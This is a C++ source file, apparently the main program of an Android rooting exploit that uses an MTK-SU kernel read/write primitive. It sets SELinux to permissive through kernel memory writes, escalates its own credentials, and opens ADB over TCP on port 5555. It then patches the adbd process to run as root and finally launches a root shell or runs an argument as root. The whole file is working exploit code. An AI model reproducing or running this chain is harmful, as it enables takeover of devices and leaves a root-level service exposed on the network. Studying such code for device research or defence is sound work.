#include <errno.h>
#include <string.h>
#include <sys/system_properties.h>
#include <sys/wait.h>
#include <unistd.h>

#include "kallsyms.hpp"
#include "log.hpp"
#include "mtk_su.hpp"
#include "selinux.hpp"
#include "task.hpp"

static bool set_android_property(const char* name, const char* value)
{
	errno = 0;
	const int result = __system_property_set(name, value);
	if (result != 0) {
		log_error("Failed to set Android property %s=%s: rc=%d errno=%d (%s)", name, value,
		          result, errno, strerror(errno));
		return false;
	}
	log_info("Set Android property %s=%s", name, value);
	return true;
}

static bool configure_tcp_adb_from_init_domain()
{
	// TCP ADB only needs the port properties. Do not touch sys.usb.config here:
	// on this appliance that wakes unrelated framework/init control paths after
	// adbd has already been restarted and patched.
	set_android_property("service.adb.tcp.port", "5555");
	set_android_property("persist.adb.tcp.port", "5555");

	// Android's `stop adbd; start adbd` commands are ctl.* property messages.
	// Send them before system() executes /system/bin/sh and transitions this
	// process from init to the more restricted toolbox SELinux domain.
	set_android_property("ctl.stop", "adbd");
	usleep(300000);
	const bool started = set_android_property("ctl.start", "adbd");
	// Patch credentials only after adbd has completed its normal privilege-drop
	// path; doing it earlier would allow adbd to overwrite our replacement.
	usleep(1500000);
	return started;
}

static int fail_with_cleanup(MTKSu& kern_rw, const char* message)
{
	log_error("%s", message);
	if (!kern_rw.cleanup()) {
		log_error("Kernel RW cleanup also failed while aborting");
	} else {
		log_info("Kernel RW cleanup completed before aborting");
	}
	return 1;
}

int main(int argc, char** argv)
{
	log_info("Initializing kernel read and write");
	auto kern_rw = std::make_unique<MTKSu>();
	bool success = kern_rw->initialize();
	if (!success) {
		log_error("Failed to initialize the kernel read/write");
		return 1;
	}

	log_info("Building the kernel symbols table");
	auto symbol_table = std::make_unique<std::map<std::string, uint64_t>>();
	success = build_kernel_symbol_table(*kern_rw.get(), *symbol_table.get());
	if (!success) {
		return fail_with_cleanup(*kern_rw.get(), "Failed to build the kernel symbols table");
	}

	bool is_enforcing = true;
	bool status_file_read = is_selinux_enforcing(is_enforcing);
	if (!status_file_read) {
		log_info("SELinux status file is unavailable; using the kernel symbol fallback");
	}
	if (!status_file_read || is_enforcing) {
		log_info("Disabling SELinux via the kernel symbol table");
		success = set_selinux_permissive(*kern_rw.get(), *symbol_table.get());
		if (!success) {
			return fail_with_cleanup(*kern_rw.get(), "Failed to set SELinux permissive via kernel memory");
		}
	} else {
		log_info("SELinux is already permissive");
	}

	log_info("Escalating credentials");
	success = escalate_creds(*kern_rw.get(), *symbol_table.get());
	if (!success) {
		return fail_with_cleanup(*kern_rw.get(), "Failed to escalate credentials");
	}

	bool adb_started = false;
	if (!switch_to_init_selinux_context()) {
		log_info("Continuing without an init-domain context; SSH remains available");
	} else {
		adb_started = configure_tcp_adb_from_init_domain();
		if (!adb_started) {
			log_info("ctl.start adbd failed; checking for an existing adbd task");
		}
		if (!escalate_task_by_command_name(*kern_rw.get(), *symbol_table.get(), "adbd")) {
			log_info("TCP ADB started, but adbd credential escalation failed");
		} else {
			log_info("Verified adbd root credentials");
		}
	}

	success = kern_rw->cleanup();
	if (!success) {
		// Best effort cleanup
		log_error("Kernel RW cleanup failed");
	}

	if (argc >= 2) {
		log_info("Running command as root: %s", argv[1]);
		int rc = system(argv[1]);
		log_info("Command returned %d", rc);
		if (rc == -1) {
			log_error("Failed to start post-root command: %s", strerror(errno));
			return 1;
		}
		if (WIFEXITED(rc)) {
			const int exit_code = WEXITSTATUS(rc);
			if (exit_code != 0) {
				log_error("Post-root command failed with exit code %d", exit_code);
			}
			return exit_code;
		}
		if (WIFSIGNALED(rc)) {
			log_error("Post-root command terminated by signal %d", WTERMSIG(rc));
		}
		return 1;
	} else {
		log_info("Popping root shell");
		int rc = system("/system/bin/sh");
		return (rc != -1 && WIFEXITED(rc)) ? WEXITSTATUS(rc) : 1;
	}
}
